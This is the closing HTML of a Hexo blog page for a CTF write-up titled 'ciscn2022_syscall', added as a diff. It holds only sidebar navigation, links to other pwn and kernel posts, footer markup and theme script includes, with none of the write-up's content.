+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn2022_syscall"><span class="toc-number">1.</span> <span class="toc-text"> ciscn2022_syscall</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li class="active"><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/06/19/ciscn-2022-popcalc/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" title="高版本glibc堆的几种利用手法">高版本glibc堆的几种利用手法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="滴水逆向_学习笔记">滴水逆向_学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/18/starctf_examination/" title="examination">examination</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/kernel/" title="In kernel">kernel</a>
+</div>
+
+    <span><a href="/2022/05/02/ciscn-babydriver/" title="ciscn_babydriver">ciscn_babydriver</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/19/ciscn-2022-popcalc/" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="slab、slub、slob学习记录">slab、slub、slob学习记录</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/kernel/" title="In kernel">kernel</a>
+</div>
+
+    <span><a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" title="强网杯2018_core">强网杯2018_core</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/01/note-file/" title="note_file">note_file</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/23/test/" title="test">test</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/torghast/" title="torghast">torghast</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/06/18/ciscn2022-syscall/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
